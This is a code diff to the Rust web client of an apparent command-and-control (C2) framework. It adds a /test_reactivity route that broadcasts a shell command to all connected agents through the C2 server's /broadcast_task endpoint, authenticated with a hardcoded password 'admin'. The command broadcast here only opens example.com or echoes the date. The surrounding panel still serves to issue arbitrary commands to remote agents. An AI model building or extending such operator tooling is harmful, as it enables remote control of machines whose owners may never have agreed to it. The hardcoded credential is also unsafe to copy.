@@ -579,6 +579,39 @@ async fn create_task(
     Ok(Redirect::to(&format!("/agent/{}", agent_id)))
 }
 
+async fn test_reactivity() -> Result<impl IntoResponse, String> {
+    let c2_server_url = get_c2_server_url();
+
+    #[derive(Serialize)]
+    struct BroadcastRequest {
+        password: String,
+        command: String,
+    }
+
+    // Use a universal command that attempts to open a web page on different platforms
+    // The agent will execute this on their respective OS
+    let command = "if command -v xdg-open > /dev/null 2>&1; then xdg-open https://www.example.com; elif command -v open > /dev/null 2>&1; then open https://www.example.com; elif command -v start > /dev/null 2>&1; then start https://www.example.com; else echo 'Reactivity test: Command received at '$(date); fi".to_string();
+
+    let request = BroadcastRequest {
+        password: "admin".to_string(),
+        command,
+    };
+
+    let client = reqwest::Client::new();
+    let response = client
+        .post(format!("{}/broadcast_task", c2_server_url))
+        .json(&request)
+        .send()
+        .await
+        .map_err(|e| format!("Failed to broadcast task: {}", e))?;
+
+    if !response.status().is_success() {
+        return Err(format!("Server returned error: {}", response.status()));
+    }
+
+    Ok(Redirect::to("/"))
+}
+
 #[tokio::main]
 async fn main() {
     let c2_server_url = get_c2_server_url();
@@ -586,7 +619,8 @@ async fn main() {
     let app = Router::new()
         .route("/", get(index))
         .route("/agent/:id", get(agent_detail))
-        .route("/agent/:id/task", post(create_task));
+        .route("/agent/:id/task", post(create_task))
+        .route("/test_reactivity", post(test_reactivity));
 
     let addr = SocketAddr::from(([127, 0, 0, 1], 3000));
     println!("[*] [ REDACTED ] C2 Web Client starting...");
